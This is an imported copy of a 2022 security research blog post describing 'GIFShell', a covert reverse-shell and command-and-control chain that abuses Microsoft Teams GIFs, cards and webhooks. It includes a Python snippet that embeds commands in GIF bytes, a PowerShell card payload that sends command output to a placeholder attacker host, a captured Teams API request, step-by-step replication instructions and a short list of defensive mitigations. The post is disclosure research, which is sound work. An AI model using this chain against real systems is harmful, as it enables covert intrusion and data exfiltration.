---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-24_gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs.md
original_filename: 2022-08-24_gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs.md
title: “GIFShell” — Covert Attack Chain and C2 Utilizing Microsoft Teams GIFs
category: documents
detected_topics:
- rate-limit
- csrf
- sso
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- rate-limit
- csrf
- sso
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 2e30b1df212ebc8b825ed81a5a6b1a648bcdc7fc0f53aff093ec9395720b7536
text_sha256: a0039cb4c19b327ad17f49beacfd82b46ba92210656840fe968d4d1fa7d290a3
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# “GIFShell” — Covert Attack Chain and C2 Utilizing Microsoft Teams GIFs

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-24_gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs.md
- Source Type: markdown
- Detected Topics: rate-limit, csrf, sso, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `2e30b1df212ebc8b825ed81a5a6b1a648bcdc7fc0f53aff093ec9395720b7536`
- Text SHA256: `a0039cb4c19b327ad17f49beacfd82b46ba92210656840fe968d4d1fa7d290a3`


## Content

---
title: "“GIFShell” — Covert Attack Chain and C2 Utilizing Microsoft Teams GIFs"
url: "https://medium.com/@bobbyrsec/gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs-1618c4e64ed7"
authors: ["Bobby Rauch"]
programs: ["Microsoft"]
bugs: ["Phishing"]
publication_date: "2022-08-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2266
scraped_via: "browseros"
---

# “GIFShell” — Covert Attack Chain and C2 Utilizing Microsoft Teams GIFs

Top highlight

“GIFShell” — Covert Attack Chain and C2 Utilizing Microsoft Teams GIFs
Bobbyr
Follow
10 min read
·
Aug 24, 2022

159

10

Table of Contents
Introduction
Insecure Design Elements/Vulnerabilities
“GIFShell” Walkthrough
Suggested Mitigations For Vendors
Replication Steps
References
Introduction:

*All GIFs contained within this post can be watched in HD for clearer viewing, Medium unfortunately does not allow this to be set by default*

GIFShell POC — https://gfycat.com/ifr/shorttermbrownindigobunting?controls=0&speed=2&hd=1
Press enter or click to view image in full size
Architectural Diagram of GIFShell

Seven different insecure design elements/vulnerabilities present in Microsoft Teams, can be leveraged by an attacker, to execute a reverse shell between an attacker and victim, where no communication is directly exchanged between an attacker and a victim, but is entirely piped through malicious GIFs sent in Teams messages, and Out of Bounds (OOB) lookups of GIFs conducted by Microsoft’s own servers. This unique C2 infrastructure can be leveraged by sophisticated threat actors to avoid detection by EDR and other network monitoring tools. Particularly in secure network environments, where Microsoft Teams might be one of a handful of allowed, trusted hosts and programs, this attack chain can be particularly devastating.

Two additional vulnerabilities discovered in Microsoft Teams, a lack of permission enforcement and attachment spoofing, allow for the GIFShell stager to be convincingly dropped and executed on the victim’s machine, completing the attack chain from victim compromise to covert communications. This is outlined in a separate research post:

Microsoft Teams — Attachment Spoofing and Lack of Permissions Enforcement Leads to RCE via NTLM…
Table of Contents

medium.com

This entire attack chain and related insecure design elements/vulnerabilities, were reported to Microsoft in May and June of 2022, however after 85 days of review, the reports did not meet their “bar for servicing” despite this being “great research”. Microsoft has explicitly granted permission to “blog about/discuss this case and/or present your findings publicly”.

It should be noted that “GIFShell” was tested on many of Microsoft Teams competitors and the same behavior was not present.

The reports were submitted for Teams — Version 1.5.00.11163 (And Earlier). These insecure design elements/vulnerabilities remain unpatched in the most recent version of Teams and the GIFShell attack chain can be carried on the most recent versions of Teams.

Oftentimes, companies and engineering teams make design decisions based on “assumed risk”, whereby a potentially low impact vulnerability is left unpatched or a security feature is disabled by default, in order to achieve some business objective. I believe this research is demonstrative of an instance where a series of design decisions and “assumed risks” made by a product engineering team, can be chained together into a more pernicious attack chain, and a far higher risk exploit than the product designers imagined was possible.

Insecure Design Elements/Vulnerabilities:

There are seven separate insecure design elements/vulnerabilities which allow for the GIFShell attack chain to occur:

When a new tenant is created in Microsoft, Microsoft Teams by default allows for all external senders to send messages to users within that tenant. Many organization admins likely are not even aware, that their organization allows for External Teams collaboration.
Press enter or click to view image in full size
https://docs.microsoft.com/en-us/microsoftteams/manage-external-access

2. Microsoft Teams messages are stored in plain-text, within the low-privileged user’s file directory, which allows for a simple staged payload to constantly scan for new content appended to the logs from Microsoft Teams messages being received.

Microsoft Team’s (Work or School Version) Log Location:

$HOME\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\*.log

Press enter or click to view image in full size
25 malware samples accessing the “https_teams.microsoft.com_0.indexeddb.leveldb” directory

3. Reading of plain text Teams log files does not require administrator or elevated privileges, which allows for the stager to run and scan the log files.

4. Microsoft Teams attempts to render GIFs included in Microsoft Teams Cards, on behalf of the end user. This allows for Out of Bounds HTTP and DNS requests to be sent from Microsoft infrastructure, attempting to fetch GIFs included in Microsoft Teams Cards. The URL which carries out these lookups on behalf of the user is:

https://urlp.asm.skype.com/v1/url/content?url=<attacker-public-ip>/<exfiltrated-data>.gif

Press enter or click to view image in full size
IP Details of Teams GIF Lookup Server
Press enter or click to view image in full size
Trusted host of OOB GIF lookups
Press enter or click to view image in full size
29 malware samples utilizing the Skype URL

5. The content of base64 encoded GIFs included in Microsoft Teams messages, are not scanned for malicious content, or bytes that are not actually part of the GIF header or image content.

Here is a Python snippet so you can try embedding malicious commands in a GIF yourself:

import base64
token = ""
def gif_embedder():
  my_str = ""
  my_str_as_bytes = str.encode("whoami;" + my_str)
  with open("giphy2.gif", "rb") as f:
  original =  (f.read())
  test = ''
  original2 = original + my_str_as_bytes
  base64_gif_encoded = base64.b64encode(original2)
  base64_gif_encoded = base64_gif_encoded.decode()
  print (base64_gif_encoded)
gif_embedder()
If you download and parse the byte content of this GIF, you will see the command “whoami” embedded within

6. Sending of Microsoft Teams messages to an individual, which are POST requests with JSON bodies, do not have any CSRF protections or rate limiting protections, which allows for an attacker to easily automate the sending of messages using the Python requests module, bypassing any restrictions put in place by the Microsoft Graph API, which is supposed to be the programmatic interface developers use to send Teams messages.

POST /v1/users/ME/conversations/19%3A307c579d-44ea-496c-981e-df92ebfdf9ab_9e02156d-981c-4a84-b2bf-0c5cc1382b8c%40unq.gbl.spaces/messages HTTP/2
Host: amer.ng.msg.teams.microsoft.com
Content-Length: 217
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
X-Ms-Session-Id: d8a5f3f3-10b5-2413-e7da-302dee811e82
Behavioroverride: redirectAs404
X-Ms-Scenario-Id: 5035
X-Ms-Client-Env: pds-prod-azsc-usea-01
X-Ms-Client-Type: web
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/json
Clientinfo: os=windows; osVer=10; proc=x86; lcid=en-us; deviceType=1; country=us; clientName=skypeteams; clientVer=1415/1.0.0.2022051616; utcOffset=-04:00; timezone=America/New_York
Accept: json
X-Ms-Client-Version: 1415/1.0.0.2022051616
X-Ms-User-Type: null
Authentication: skypetoken=<redacted>
Sec-Ch-Ua-Platform: "macOS"
Origin: https://teams.microsoft.com
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://teams.microsoft.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
{"content":"<p>Test message</p>","messagetype":"RichText/Html","contenttype":"text","amsreferences":[],"clientmessageid":"2298590383200541633","imdisplayname":"Chris Green","properties":{"importance":"","subject":""}}

7. Sending of Microsoft Teams messages to a public webhook, are POST requests with JSON bodies, that require no authentication, have no CSRF protections, or rate limiting protections. This allows for simple data exfiltration via Teams Cards embedded with GIFs from the victim’s machine.

gifendpoint = http://<attacker-site>/<base64-encoded-command-output>.gif
json_payload = "{`n `"@type`": `"MessageCard`",`n `"@context`": `"https://schema.org/extensions`",`n `"summary`": `"2 new Yammer posts`",`n `"themeColor`": `"0078D7`",`n `"sections`": [`n  {`n  `"activityImage`":`""+ gifendpoint + "`",`n  `"activityTitle`": `"Chase Miller`",`n  `"activitySubtitle`": `"2 hours ago - 3 comments`",`n  `"facts`": [`n  {`n  `"name`": `"Keywords:`",`n  `"value`": `"Surface`"`n  },`n  {`n  `"name`": `"Group:`",`n  `"value`": `"Helpdesk Support`"`n  }`n  ],`n  `"text`": `"Can You Solve the Math Problem That Is Baffling the Internet? More than 530,000 people were commenting on one single Facebook picture. Are you smart enough to figure it out?`",`n  `"potentialAction`": [`n  {`n  `"@type`": `"OpenUri`",`n  `"name`": `"View conversation`"`n  }`n  ]`n  }`n  `n ]`n}"
curl -H 'Content-Type: application/json' -d json_payload <YOUR WEBHOOK URL>

More information about Teams webhooks can be found here:

Create and send messages - Teams
You can create actionable messages and send it through Incoming Webhook or Office 365 Connector. The actionable…

docs.microsoft.com

“GIFShell” Walkthrough:

Referenced GIFShell POC code can be found here:

GitHub - bobbyrsec/Microsoft-Teams-GIFShell
Replication Steps: There are a few prerequisites required to replicate the attack chain above: The GIFShell Python…

github.com

First, a stager is delivered to the victim, and executed on the victim’s machine. Once again, I outline in the next research post (https://medium.com/@bobbyrsec/microsoft-teams-attachment-spoofing-and-lack-of-permissions-enforcement-leads-to-rce-via-ntlm-458aea1826c5), how we can deliver this stager to the victim via Microsoft Teams. We utilize the GIFShell PowerShell stager (see GitHub repo linked above), which can be seen running in the bottom left-hand side of the POC video in the Introduction, but the stager can be of any type, written in any programming language. The stager works as follows:

Repeatedly scans the Microsoft Teams log files for incoming base64 encoded GIFs.
When a base64 encoded GIF is received in Microsoft Teams and appears in the Teams log files, the GIFs byte content is decoded, and the attacker’s malicious commands that are embedded in the GIF are executed as system commands on the victim’s machine.
The output of these commands is base64 encoded, and appended to the attacker’s URL, in the form http://<attacker-public-ip>/<base64-encoded-command-output>.gif
A Microsoft Teams Card is created, containing the previous GIF URL. In this POC, we disguise the GIF in a Microsoft Teams Survey Card. A Teams Card is a simple JSON object. Documentation about Teams cards can be found here:
Cards - Teams
A card is a user interface (UI) container for short or related pieces of information. Cards can have multiple…

docs.microsoft.com

5. That Teams Card is sent to the attacker’s public Teams Webhook via a JSON body of a POST request.

Get Bobbyr’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Next, the attacker executes the GIFShell Python script (see GitHub repo linked above), which can be seen running in the top left portion of the video in the Introduction. The script works as follows:

Prompts the attacker to enter their desired commands.
Those commands are injected as bytes into a GIF of the attacker’s choosing, so the GIF still appears legitimate and renders in Microsoft Teams, but the byte content of the GIF will be parsed by the stager, and those commands will be executed as system commands on the victim’s machine.
Those GIFs are then sent in a Teams chat to the victim, as inline base64 encoded GIFs.
Listens for HTTP lookups on the specified port, and decodes the base64 encoded name of the GIF that Microsoft attempts to fetch from the Teams Card sent by the victim. This base64 decoded content is the command output of the attacker’s command, from the victim’s machine.

The bottom right-hand side of the POC video in the Introduction shows the malicious GIFs being delivered to the victim, and the top right-hand side of the video shows the Teams Card embedded with the GIF URL being received by the attacker’s webhook from the victim.

The video demonstrates the OOB lookup of the GIF URL that then occurs when the webhook receives the Teams Card embedded with the GIF URL; this sends the command output back to the attacker’s Python script listener. https://gfycat.com/ifr/obeseablebluewhale?controls=0&speed=2&hd=1
Microsoft Teams does not even need to be open, or for the victim to open the chat containing the GIFs for this attack chain to work. The video demonstrates the exact same POC, except Teams is running as a background app, as shown in the Task Manager. The Teams program appears closed to the user. https://gfycat.com/ifr/negligiblebitesizedbrownbear?controls=0&speed=2&hd=1
Suggested Mitigations for Vendors:
Turn off the default external access settings in the Teams Admin Center linked below, and if the company needs to communicate with external contacts, do so through Teams guest access functionality.
Manage external meetings and chat - Microsoft Teams
You can configure external meetings and chat in Teams using the external access feature. External access is a way for…

docs.microsoft.com

2. Monitor for unusual access to Microsoft Team’s log files

Microsoft Team’s (Work or School Version) Log Location:

$HOME\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\*.log

3. Monitor for unusual requests sent to the Teams GIF lookup server, particularly for long GIF filenames which may contain exfiltrated data.

https://urlp.asm.skype.com/v1/url/content?url=<attacker-public-ip>/<exfiltrated-data>.gif

Replication Steps:

There are a few prerequisites required to replicate the attack chain above:

The GIFShell Python script (found in the Github repo linked above), which should be executed on the attacker’s machine
The GIFShell PowerShell stager, executed on the victim’s machine (found in the Github repo linked above)
Two Microsoft Azure Organizations or Tenants. The attacker organization or tenant should have at least 2 users, and the victim organization should have at least 1 user. This is for testing the Microsoft Teams Work Edition
A Teams channel with a publicly available webhook
A GIF of your choice
A public facing IP which can be used as a listener for incoming web requests

1) Open the Python script, and edit instances of the `token` variable with the `skypetoken_asm` cookie value from your authenticated browser session running Microsoft Teams as the attacker.

Press enter or click to view image in full size

2) Open Microsoft Teams as an attacker, and create a new chat with the victim. Look at the network traffic, and extract the Teams URL of this conversation. The URL should be in the form
“https://amer.ng.msg.teams.microsoft.com/v1/users/ME/conversations/<unique-identifier>@unq.gbl.spaces/messages”

Press enter or click to view image in full size

3) Open the GIFShell Python script, and edit instances of the `burp_url` variable with the URL from Step #2.

4) Open the Microsoft Teams chat associated with the webhook created by the attacker, in the authenticated browser session running Microsoft Teams as the attacker.

5) Run the GIFShell Python script on the attacking machine — this will create a prompt to enter desired commands to be run on the victim’s machine.

6) Open the GIFShell PowerShell stager script, and edit the $originalendpoint and $gifendpoint variables, changing the domain to the public IP address of the attacking machine.

7) Open The GIFShell PowerShell stager script, and edit the $response variable, changing the webhook, to the value of the attacker’s publicly available webhook.

8) Run the PowerShell stager script on the victim’s machine.

9) Execute the desired commands in the GIFShell Python script prompt.

10) Ensure that while the desired commands are being executed, the Teams application is open to the chat associated with the publicly available webhook.

References:

https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py

Microsoft Teams and Skype Logging Privacy Issue
This blog post focuses on the privacy issues that Microsoft Teams & Skype desktop clients pose. The log database in…

www.trustwave.com

Your Microsoft Teams chats aren't as private as you think..
Encrypt and Anonymize Your Internet Connection for as Little as $3/mo with PIA VPN. Learn More…

infinitelogins.com

Microsoft Teams: Desktop and Web Client Log Location
Update 2017/11/16 - New keyboard shortcuts for Web Client. Microsoft Teams preview was recently released and to help…

uclobby.com

Contact: @bobbyrsec on Twitter
